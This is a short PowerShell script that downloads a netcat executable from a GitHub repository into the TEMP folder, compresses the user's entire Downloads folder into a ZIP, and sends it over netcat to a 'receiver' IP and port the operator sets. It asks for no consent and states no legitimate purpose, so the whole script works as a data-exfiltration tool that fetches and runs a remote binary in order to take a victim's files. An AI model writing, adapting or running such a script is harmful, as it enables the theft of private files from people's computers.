# Parameters
$downloadsFolder = "$env:USERPROFILE\Downloads"
$zipFilePath = "$env:TEMP\Downloads.zip"
$ncatUrl = "https://github.com/gr33n37/Ncat-HDD-CLONER/raw/main/nc.exe"  # URL to download ncat
$ncatPath = "$env:TEMP\nc.exe"  # Path to save downloaded ncat
$targetIP = "127.0.0.1"  # Update this to the receiver's IP address
$targetPort = 12345

# Download ncat
Invoke-WebRequest -Uri $ncatUrl -OutFile $ncatPath

# Create a ZIP file of the Downloads folder
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath
}

Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::CreateFromDirectory($downloadsFolder, $zipFilePath)

# Send the ZIP file via Netcat
Start-Process -FilePath $ncatPath -ArgumentList "$targetIP $targetPort < $zipFilePath" -NoNewWindow -Wait

Write-Output "Transfer completed successfully."
